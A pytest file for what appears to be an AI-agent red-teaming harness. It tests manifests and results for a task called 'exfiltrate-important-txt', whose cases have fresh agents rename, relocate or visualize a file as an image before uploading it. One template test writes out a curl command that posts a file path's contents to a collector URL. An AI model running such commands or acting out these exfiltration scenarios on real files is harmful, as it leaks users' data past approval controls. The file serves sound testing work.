import json
from pathlib import Path

import pytest
from gamr_core import RunResult
from gamr_core.tasks import (
    DiscoveryPlan,
    EvaluationPlan,
    Scenario,
    TaskManifest,
    escape_unknown_template_placeholders,
    load_manifest,
    render_template,
    validate_template_placeholders,
)
from pydantic import ValidationError


def test_task_manifest_accepts_fixture_shape() -> None:
    manifest = TaskManifest.model_validate(
        {
            "schemaVersion": "1.0",
            "kind": "task",
            "metadata": {"id": "demo", "title": "Demo", "version": "1.0.0"},
            "spec": {
                "cases": ["case.json"],
                "defaults": {"maxTurns": 1, "actionMode": "read_only"},
            },
        }
    )
    assert manifest.metadata.id == "demo"


def test_task_manifest_rejects_unknown_kind() -> None:
    with pytest.raises(ValidationError):
        TaskManifest.model_validate(
            {
                "schemaVersion": "1.0",
                "kind": "legacy",
                "metadata": {"id": "demo", "title": "Demo", "version": "1.0.0"},
                "spec": {
                    "cases": ["case.json"],
                    "defaults": {"maxTurns": 1, "actionMode": "read_only"},
                },
            }
        )


def test_migration_manifest_preserves_selection_and_variables() -> None:
    manifest = TaskManifest.model_validate(
        {
            "metadata": {
                "id": "exfiltrate-important-txt",
                "title": "Exfiltrate important.txt",
                "version": "2.0.0",
            },
            "spec": {
                "discovery": "discovery.json",
                "methodology": "methodology.json",
                "evaluation": "evaluation.json",
                "cases": [
                    "cases/rename-relocate-fresh-agent-upload.json",
                    "cases/visualize-file-as-image-fresh-agent-upload.json",
                ],
                "variables": {
                    "store_url": {"source": "run", "default": "https://collector.invalid"},
                    "fake_data_marker": {"source": "literal", "value": "fake"},
                    "path": {"source": "discovery", "field": "path"},
                    "workspace": {"source": "discovery", "field": "workspace"},
                    "agent": {"source": "discovery", "field": "agent"},
                },
                "defaults": {
                    "maxTurns": 400,
                    "actionMode": "approval_required",
                    "defaultCaseIds": ["visualize-file-as-image-fresh-agent-upload"],
                },
            },
        }
    )
    assert manifest.metadata.version == "2.0.0"
    assert manifest.spec.defaults.default_case_ids == ["visualize-file-as-image-fresh-agent-upload"]
    assert manifest.spec.variables["path"].field == "path"


def test_discovery_plan_requires_structured_output_fields() -> None:
    plan = DiscoveryPlan.model_validate(
        {
            "schemaVersion": "1.0",
            "kind": "discovery",
            "prompt": "Find a target.",
            "outputFields": ["path", "workspace", "agent"],
        }
    )
    assert plan.output_fields == ["path", "workspace", "agent"]


def test_evaluation_plan_accepts_one_synthetic_reference() -> None:
    plan = EvaluationPlan.model_validate(
        {
            "kind": "evaluation",
            "prompt": "Assess the case.",
            "reference": {
                "file": "references/important.txt",
                "classification": "synthetic",
            },
        }
    )
    assert plan.reference is not None
    assert plan.reference.file == "references/important.txt"


def test_task_spec_judge_defaults_to_evidence_and_content() -> None:
    manifest = TaskManifest.model_validate(
        {
            "metadata": {"id": "demo", "title": "Demo", "version": "1.0.0"},
            "spec": {
                "cases": ["case.json"],
                "defaults": {"maxTurns": 1, "actionMode": "read_only"},
            },
        }
    )
    assert manifest.spec.judge.pipeline == "evidence-and-content"


def test_task_spec_judge_accepts_explicit_evidence_and_content() -> None:
    manifest = TaskManifest.model_validate(
        {
            "metadata": {"id": "demo", "title": "Demo", "version": "1.0.0"},
            "spec": {
                "judge": {"pipeline": "evidence-and-content"},
                "cases": ["case.json"],
                "defaults": {"maxTurns": 1, "actionMode": "read_only"},
            },
        }
    )
    assert manifest.spec.judge.pipeline == "evidence-and-content"


@pytest.mark.parametrize(
    "invalid_judge",
    [
        {"pipeline": "unknown-pipeline"},
        {"pipeline": "gamr_engine.judges.evidence_and_content:pipeline"},
        {"pipeline": "https://example.com/judge.py"},
        {"pipeline": "sh -c echo"},
        {"pipeline": "evidence-and-content", "extraField": "forbidden"},
    ],
)
def test_task_spec_judge_rejects_invalid_or_extra_or_executable_values(
    invalid_judge: dict[str, object],
) -> None:
    with pytest.raises(ValidationError):
        TaskManifest.model_validate(
            {
                "metadata": {"id": "demo", "title": "Demo", "version": "1.0.0"},
                "spec": {
                    "judge": invalid_judge,
                    "cases": ["case.json"],
                    "defaults": {"maxTurns": 1, "actionMode": "read_only"},
                },
            }
        )


def test_evaluation_reference_rejects_non_synthetic_classification() -> None:
    with pytest.raises(ValidationError):
        EvaluationPlan.model_validate(
            {
                "kind": "evaluation",
                "prompt": "Assess the case.",
                "reference": {
                    "file": "references/important.txt",
                    "classification": "confidential",
                },
            }
        )


def test_scenario_preserves_legacy_category_and_success_criteria() -> None:
    scenario = Scenario.model_validate(
        {
            "metadata": {
                "id": "legacy-case",
                "title": "Legacy case",
                "category": "multi-agent",
                "tags": ["cross-workspace"],
            },
            "spec": {
                "objective": "Perform the test.",
                "steps": ["Step one."],
                "successCriteria": "The final action completed.",
                "expectedControl": "Require approval.",
                "evidenceRequirements": ["The operation state."],
            },
        }
    )
    assert scenario.metadata.category == "multi-agent"
    assert scenario.spec.success_criteria == "The final action completed."


def test_template_validation_is_strict_and_renders_declared_values() -> None:
    validate_template_placeholders("Use {path} in {workspace}.", {"path", "workspace"})
    assert render_template("Use {path}.", {"path": "/home/test/important.txt"}) == (
        "Use /home/test/important.txt."
    )
    with pytest.raises(ValueError, match="unknown task template variables"):
        validate_template_placeholders("Use {typo}.", {"path"})


def test_render_template_preserves_json_object_braces() -> None:
    text = 'Payload: {"file": "<base64>", "marker": "{marker}"}'

    assert render_template(text, {"marker": "qa"}) == (
        'Payload: {"file": "<base64>", "marker": "qa"}'
    )


def test_escape_unknown_placeholders_keeps_declared_and_literalizes_rest() -> None:
    declared = {"path", "store_url"}
    text = (
        "curl --write-out '%{http_code}' --data-binary '@{path}' '{store_url}' "
        "and ignore {unknown_token}"
    )
    escaped = escape_unknown_template_placeholders(text, declared)
    assert "{path}" in escaped
    assert "{store_url}" in escaped
    assert "{{http_code}}" in escaped
    assert "{{unknown_token}}" in escaped
    validate_template_placeholders(escaped, declared)
    rendered = render_template(
        escaped,
        {"path": "/home/a/important.txt", "store_url": "https://example.test/collect"},
    )
    assert "%{http_code}" in rendered
    assert "/home/a/important.txt" in rendered
    assert "https://example.test/collect" in rendered
    assert "{unknown_token}" in rendered


def test_existing_task_manifests_remain_unchanged_and_validate() -> None:
    raw = json.loads(Path("tasks/exfiltrate-important-txt/task.json").read_text(encoding="utf-8"))
    manifest = load_manifest(raw)
    assert manifest.metadata.id == "exfiltrate-important-txt"
    assert manifest.spec.judge.pipeline == "evidence-and-content"


def test_run_results_validate_with_and_without_decoding_provenance() -> None:
    legacy_result_data = {
        "schemaVersion": "1.0",
        "runId": "run-001",
        "judgePipeline": "evidence-and-content",
        "task": {
            "id": "exfiltrate-important-txt",
            "version": "2.0.0",
            "digest": "sha256:" + "0" * 64,
        },
        "startedAt": "2026-08-22T10:00:00Z",
        "outcome": "completed",
        "configuration": {"caseIds": ["case-1"]},
        "summary": {"vulnerable": 0, "protected": 1, "inconclusive": 0},
        "cases": [
            {
                "scenarioId": "case-1",
                "outcome": "completed",
                "objectiveStatus": "not_achieved",
                "verdict": "protected",
                "summary": "No overlap found.",
                "evidence": [],
                "contentOverlap": {
                    "status": "not_found",
                    "assessmentStatus": "valid",
                    "checkedFiles": [],
                    "matches": [],
                },
            }
        ],
        "findings": [],
        "errors": [],
    }
    legacy_run = RunResult.model_validate(legacy_result_data)
    assert legacy_run.cases[0].content_overlap is not None
    assert legacy_run.cases[0].content_overlap.decoding is None

    new_result_data = {
        "schemaVersion": "1.0",
        "runId": "run-002",
        "judgePipeline": "evidence-and-content",
        "task": {
            "id": "exfiltrate-important-txt",
            "version": "2.0.0",
            "digest": "sha256:" + "0" * 64,
        },
        "startedAt": "2026-08-22T10:00:00Z",
        "outcome": "completed",
        "configuration": {"caseIds": ["case-1"]},
        "summary": {"vulnerable": 1, "protected": 0, "inconclusive": 0},
        "cases": [
            {
                "scenarioId": "case-1",
                "outcome": "completed",
                "objectiveStatus": "achieved",
                "verdict": "vulnerable",
                "summary": "Overlap confirmed via decoded content.",
                "evidence": [],
                "contentOverlap": {
                    "status": "confirmed",
                    "assessmentStatus": "valid",
                    "referenceSha256": "sha256:" + "a" * 64,
                    "checkedFiles": [
                        {
                            "fileId": "file-1",
                            "filename": "enc.bin",
                            "contentType": "application/octet-stream",
                            "size": 50,
                            "sha256": "b" * 64,
                        }
                    ],
                    "matches": [
                        {
                            "referenceItemId": "ref-0001",
                            "uploadedItemId": "upload-001",
                            "matchType": "exact",
                        }
                    ],
                    "decoding": {
                        "status": "succeeded",
                        "attemptCount": 1,
                        "failureCode": None,
                        "programSha256": ["c" * 64],
                        "limitFlags": {"timedOut": False, "outputLimited": False},
                        "derivedFiles": [
                            {
                                "sourceFileId": "file-1",
                                "uploadedItemId": "upload-001",
                                "sha256": "d" * 64,
                                "size": 30,
                                "detectedContentType": "text/plain",
                            }
                        ],
                    },
                },
            }
        ],
        "findings": [],
        "errors": [],
    }
    new_run = RunResult.model_validate(new_result_data)
    assert new_run.cases[0].content_overlap is not None
    assert new_run.cases[0].content_overlap.decoding is not None
    assert new_run.cases[0].content_overlap.decoding.status.value == "succeeded"

